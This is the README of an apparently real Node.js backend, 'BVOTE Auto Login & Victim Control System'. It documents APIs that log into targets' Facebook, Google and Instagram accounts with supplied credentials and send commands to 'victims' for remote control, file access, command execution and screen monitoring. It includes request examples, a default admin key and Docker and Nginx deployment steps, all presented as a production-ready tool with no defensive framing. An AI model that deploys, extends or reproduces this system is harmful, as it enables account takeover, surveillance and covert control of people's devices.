# BVOTE Backend API Server

🚀 **Production-Ready Backend** for BVOTE Auto Login & Victim Control System

## 📋 Overview

A comprehensive, secure, and scalable backend API server built with Node.js, Express, and modern security practices. Supports auto login functionality, victim control management, and admin panel operations.

## ✨ Features

### 🔒 **Security**
- **JWT Authentication** with refresh tokens
- **Advanced Rate Limiting** with progressive delays
- **Input Validation & Sanitization**
- **SQL Injection Protection**
- **XSS Prevention**
- **CSRF Protection**
- **Security Headers** (HSTS, CSP, etc.)
- **Request Signature Validation**
- **IP Whitelisting/Blacklisting**
- **Honeypot Bot Detection**

### 🗄️ **Database Support**
- **SQLite** (default, file-based)
- **MySQL/MariaDB** (production recommended)
- **MongoDB** (NoSQL option)
- **Redis** (sessions & caching)

### 🎯 **Core APIs**
- **Authentication** (`/api/auth`)
  - Login/Logout with admin key support
  - User registration
  - Token refresh
  - Password change
- **Auto Login** (`/api/auto-login`)
  - Multi-platform support (Facebook, Google, Instagram, etc.)
  - Session management
  - Real-time status updates
- **Victim Control** (`/api/victims`)
  - Remote control capabilities
  - File system access
  - Command execution
  - Screen monitoring
- **Admin Panel** (`/api/admin`)
  - User management
  - System statistics
  - Audit logs

### 🔄 **Real-time Features**
- **WebSocket Support** for live updates
- **Event Broadcasting**
- **Session Synchronization**
- **Live Monitoring**

### 🚀 **Production Features**
- **Docker Support** with multi-stage builds
- **Docker Compose** for full stack deployment
- **Nginx Reverse Proxy** configuration
- **Health Checks** and monitoring
- **Graceful Shutdown**
- **Process Management** (PM2 ready)
- **Logging** with Winston
- **Backup Scripts**
- **Zero-Downtime Deployment**

## 🛠️ Installation

### Prerequisites
- **Node.js** 18+
- **npm** 9+
- **Docker** & **Docker Compose** (for containerized deployment)
- **Redis** (optional, for sessions)

### Quick Start

1. **Clone & Install**
```bash
git clone <repository-url>
cd backend
npm install
```

2. **Environment Setup**
```bash
# Copy example environment file
cp config/production.env .env

# Edit configuration
nano .env
```

3. **Database Setup**
```bash
# Initialize database (SQLite default)
npm run migrate

# Seed with initial data
npm run seed
```

4. **Start Development Server**
```bash
npm run dev
```

5. **Production Deployment**
```bash
# Using Docker
docker-compose up -d

# Or using deployment script
./scripts/deploy.sh
```

## 📁 Project Structure

```
backend/
├── config/                 # Configuration files
│   └── production.env      # Production environment
├── middleware/             # Express middleware
│   ├── auth.js            # Authentication middleware
│   ├── security.js        # Security middleware
│   └── errorHandler.js    # Error handling
├── routes/                # API route definitions
│   ├── auth.js           # Authentication routes
│   ├── autoLogin.js      # Auto login routes
│   ├── victims.js        # Victim control routes
│   └── admin.js          # Admin routes
├── services/              # Business logic services
│   ├── SecurityService.js # Security utilities
│   ├── DatabaseService.js # Database abstraction
│   ├── ChromeService.js   # Chrome automation
│   └── LoggingService.js  # Logging service
├── scripts/               # Deployment & utility scripts
│   ├── deploy.sh         # Linux/Mac deployment
│   ├── deploy.bat        # Windows deployment
│   ├── migrate.js        # Database migrations
│   └── seed.js           # Database seeding
├── nginx/                 # Nginx configuration
│   └── nginx.conf        # Reverse proxy config
├── docker-compose.yml     # Docker orchestration
├── Dockerfile            # Docker image definition
├── healthcheck.js        # Docker health check
├── server.js             # Main server file
└── package.json          # Dependencies & scripts
```

## 🔧 Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `NODE_ENV` | Environment (development/production) | `development` |
| `PORT` | Server port | `3000` |
| `JWT_SECRET` | JWT signing secret | **Change in production!** |
| `ENCRYPTION_KEY` | Data encryption key | **Change in production!** |
| `ADMIN_KEY` | Master admin key | `WEBBVOTE2025$ABC` |
| `DATABASE_URL` | Database connection string | `sqlite:./data/bvote.db` |
| `REDIS_URL` | Redis connection string | `redis://localhost:6379` |
| `CORS_ORIGIN` | Allowed CORS origins | `http://localhost:5173,http://localhost:5174` |

### Database Configuration

**SQLite (Default)**
```env
DATABASE_URL=sqlite:./data/bvote.db
```

**MySQL**
```env
DATABASE_URL=mysql://user:password@localhost:3306/bvote
```

**MongoDB**
```env
DATABASE_URL=mongodb://localhost:27017/bvote
```

## 🚀 Deployment

### Docker Deployment (Recommended)

1. **Build & Deploy**
```bash
# Build images
docker-compose build

# Start services
docker-compose up -d

# Check status
docker-compose ps
```

2. **Environment Configuration**
```bash
# Create production environment
cp config/production.env .env

# Edit sensitive values
nano .env
```

3. **SSL Setup (Production)**
```bash
# Add SSL certificates
mkdir -p nginx/ssl
cp your-cert.pem nginx/ssl/cert.pem
cp your-key.pem nginx/ssl/key.pem

# Update nginx configuration
nano nginx/nginx.conf
```

### Manual Deployment

1. **Production Build**
```bash
npm ci --only=production
npm run build
```

2. **Process Management**
```bash
# Install PM2
npm install -g pm2

# Start with PM2
pm2 start server.js --name bvote-backend

# Save PM2 configuration
pm2 save
pm2 startup
```

3. **Nginx Setup**
```bash
# Copy nginx configuration
sudo cp nginx/nginx.conf /etc/nginx/sites-available/bvote
sudo ln -s /etc/nginx/sites-available/bvote /etc/nginx/sites-enabled/

# Test and reload
sudo nginx -t
sudo systemctl reload nginx
```

## 🔍 API Documentation

### Authentication

**Login**
```bash
POST /api/auth/login
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123",
  "adminKey": "WEBBVOTE2025$ABC" // Optional for admin login
}
```

**Response**
```json
{
  "success": true,
  "message": "Login successful",
  "user": {
    "id": "user-123",
    "email": "user@example.com",
    "role": "user",
    "name": "User Name"
  },
  "token": "eyJhbGciOiJIUzI1NiIs...",
  "refreshToken": "eyJhbGciOiJIUzI1NiIs...",
  "expiresIn": "24h"
}
```

### Auto Login

**Start Auto Login Session**
```bash
POST /api/auto-login/start
Authorization: Bearer <token>
Content-Type: application/json

{
  "platformId": "facebook",
  "credentials": {
    "email": "target@email.com",
    "password": "password123"
  },
  "victimId": "victim-001",
  "options": {
    "headless": true,
    "timeout": 30000
  }
}
```

### Victim Control

**Send Command to Victim**
```bash
POST /api/victims/victim-001/commands
Authorization: Bearer <token>
Content-Type: application/json

{
  "command": "screenshot",
  "params": {
    "fullscreen": true,
    "quality": 80
  }
}
```

## 🔒 Security Best Practices

### Production Checklist

- [ ] Change all default secrets (`JWT_SECRET`, `ENCRYPTION_KEY`, `ADMIN_KEY`)
- [ ] Use HTTPS with valid SSL certificates
- [ ] Configure IP whitelisting for admin endpoints
- [ ] Set up proper CORS origins
- [ ] Enable security headers
- [ ] Configure rate limiting
- [ ] Set up monitoring and alerting
- [ ] Regular security updates
- [ ] Database backups
- [ ] Log monitoring

### Security Features

1. **Authentication Security**
   - JWT with secure signing
   - Refresh token rotation
   - Session management
   - Login attempt limiting

2. **Input Security**
   - Request validation
   - SQL injection prevention
   - XSS protection
   - Input sanitization

3. **Network Security**
   - Rate limiting
   - IP filtering
   - Request signatures
   - Security headers

4. **Data Security**
   - Encryption at rest
   - Secure password hashing
   - Sensitive data redaction
   - Audit logging

## 📊 Monitoring & Maintenance

### Health Checks
```bash
# Server health
curl http://localhost:3000/health

# Docker health
docker-compose ps
```

### Logs
```bash
# Application logs
tail -f logs/app.log

# Docker logs
docker-compose logs -f bvote-backend
```

### Backups
```bash
# Manual backup
npm run backup

# Automated backup (via deploy script)
./scripts/deploy.sh backup
```

### Performance Monitoring
- **Response times** tracked automatically
- **Error rates** logged and monitored
- **Resource usage** via Docker stats
- **Database performance** metrics

## 🛠️ Development

### Development Setup
```bash
# Install dependencies
npm install

# Start development server with hot reload
npm run dev

# Run tests
npm test

# Lint code
npm run lint
```

### Available Scripts

| Script | Description |
|--------|-------------|
| `npm start` | Start production server |
| `npm run dev` | Start development server with nodemon |
| `npm run build` | Build for production |
| `npm test` | Run test suite |
| `npm run lint` | Lint code with ESLint |
| `npm run migrate` | Run database migrations |
| `npm run seed` | Seed database with test data |

## 🤝 Contributing

1. Fork the repository
2. Create your feature branch (`git checkout -b feature/amazing-feature`)
3. Commit your changes (`git commit -m 'Add some amazing feature'`)
4. Push to the branch (`git push origin feature/amazing-feature`)
5. Open a Pull Request

## 📝 License

This project is licensed under the MIT License - see the LICENSE file for details.

## 🆘 Support

For support and questions:

- **Documentation**: Check this README and inline code comments
- **Issues**: Create a GitHub issue
- **Security**: Report security issues privately

---

**⚡ BVOTE Backend - Production Ready & Secure** 🚀
